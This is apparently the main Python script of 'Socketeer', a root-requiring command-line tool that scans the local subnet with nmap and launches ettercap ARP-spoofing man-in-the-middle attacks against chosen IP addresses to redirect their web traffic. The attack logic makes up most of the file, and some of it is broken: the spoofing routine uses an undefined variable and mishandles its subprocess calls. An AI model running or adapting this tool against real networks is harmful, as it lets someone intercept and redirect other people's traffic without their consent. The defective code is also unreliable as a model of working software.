#!/usr/bin/env python3
#Author: Icarus (www.icarus.tk)
#This file is a part of Socketeer

import sys, traceback
import os
import subprocess as sp
import time

# Start banner
os.system("cat src/banner.txt | lolcat")



def main():
    try:

        #Splash screen with iface info and current ip

        def info_splash():
            current_iface = os.popen("route | awk '/Iface/{getline; print $8}'").read()
            current_addr  = os.popen("ip route get 1.2.3.4 | awk '{print $7}'").read()
            current_ssid  = os.popen("iwgetid -r").read()
            print(" " "\u001b[35;1m[➔ Info]: " "\u001b[0mCurrent Interface:",f"\u001b[33;1m{current_iface}") 
            print(" " "\u001b[35;1m[➔ Info]: " "\u001b[0mCurrent SSID:", f"\u001b[33;1m{current_ssid}") 
            print(" " "\u001b[35;1m[➔ Info]: " "\u001b[0mCurrent inet:", f"\u001b[33;1m{current_addr}")
            
        def clear():
            os.system("clear")                  

        def scan():
            addr = os.popen("ip route show | grep -i -m1 'default via' | awk '{print $3}'").read()
            addr = addr.replace("\n","")
            out = os.popen("nmap " + addr + "/24 -n -sP | grep -i 'Nmap scan report' | awk '{print $5}'").read()
            print(" " "\u001b[35;1m[➔ Scan]: " "\u001b[0mScanned IP Addresses:", " " "\n" f" \u001b[33;1m{out}")
        
        def target():
            with open('src/target.txt', 'a') as targetf:
                targetnum = int(input("\n" " " "\u001b[34;1mEnter the number of targets: "))
                for n in range(targetnum):
                    targetip = input("\n" " " "\u001b[34;1mEnter the target IP address: ")
                    targetf.write("/"+targetip+"//"+"\n")
            print(" " "\n" " \u001b[35;1m[➔ Info]:" " \u001b[0mTarget IP has been set")

            
        def clear():
            os.system("clear")                  
            
        def htspoof():
            if os.path.getsize('src/target.txt') == 0:
                print("\n" " " "\u001b[35;1m[➔ Alert]:" " " "\u001b[31;1mYou have to set your target IP first!")
            else:
                target = os.popen("cat src/target.txt").read()
                with open('src/target.txt', 'r') as targetf:
                    print(" " "\u001b[35;1m[➔ Info]: " "Running ARP Spoofing...")
                    time.sleep(0.5)
                    ettercommand = ("sudo ettercap -Tq -M ARP")
                    for ip in targetf.readlines():
                        print(ettercommand+ip)
                        if ip == 1:
                            sp.Popen(f"sudo ettercap -Tq -M ARP /{ip}//")
                        else:
                            sp.Popen(ettercommand+ipform)
                            print(ettercommand+ipform)

                    targetf.truncate(0)
 
        def log():
            return "log"

        def commands():
            helpstr = '''\n\n Available Commands:           
                            
                            \u001b[33;1mcommands - Displays this help page

                            \u001b[33;1mscan - Scans the current network for all devices

                            \u001b[33;1mtarget - Set target device (format: target <ip>)

                            \u001b[33;1mhtspoof - Redirect user to specific webpage

                            \u001b[33;1mlog - View the active log of current network
                           
                           '''
            print(helpstr)  



        def shell():
 
            cmdlist = {"scan":scan,"target":target,"htspoof":htspoof,"log":log,"commands":commands,"clear":clear}

            info_splash()

            print(" " '\u001b[35m[Type "commands" to get a list of available commands]')
            
            while True:
                prompt = input(" " "\n" "\n"" \u001b[36;1msktr❯❯\u001b[0m ")
                
                try:
                    cmdlist[prompt]()
                except:
                    print("\n" " " "\u001b[31;1mInvalid Command") 

                
        
# Running main functions

        shell()

# Interrupt Handling for CTRL-C

    except KeyboardInterrupt:
        print("\n" "\n" " \u001b[31;1mExiting...")
        time.sleep(0.5)


# Getting root privilages

rootchk = os.getuid()
if rootchk != 0:
    sys.exit(" ""\u001b[31;1mPlease run Socketeer with Root Privilages")
else:
    main()
